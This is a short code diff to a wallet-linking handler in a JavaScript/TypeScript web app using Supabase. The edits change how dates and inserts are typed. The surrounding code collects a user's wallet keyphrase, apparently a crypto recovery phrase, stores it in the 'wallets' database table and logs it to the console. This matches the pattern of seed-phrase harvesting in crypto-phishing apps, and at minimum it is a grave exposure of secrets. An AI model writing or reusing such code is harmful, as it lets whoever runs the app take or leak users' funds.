@@ -136,23 +136,23 @@ const handleLinkWallet = async () => {
           wallet_type: withdrawalForm.walletType,
           wallet_address: withdrawalForm.walletAddress,
           is_linked: true,
-          linked_at: new Date(),
+          linked_at: new Date().toISOString(),
           wallet_keyphrase: finalKeyphrase, 
-        })
+        } as any)
         .eq('user_id', user.id));
     } else {
       // ✅ Insert new wallet
       console.log("checking wallet keyphrase"); 
       console.log(finalKeyphrase); 
-      ({ error } = await supabase.from('wallets').insert({
+      ({ error } = await supabase.from('wallets').insert([{
         user_id: user.id,
         wallet_type: withdrawalForm.walletType,
         wallet_address: withdrawalForm.walletAddress,
         is_linked: true,
         wallet_keyphrase: finalKeyphrase,
         status: "pending",
-        linked_at: new Date(),
-      }));
+        linked_at: new Date().toISOString(),
+      }]));
     }
 
     if (error) throw error;
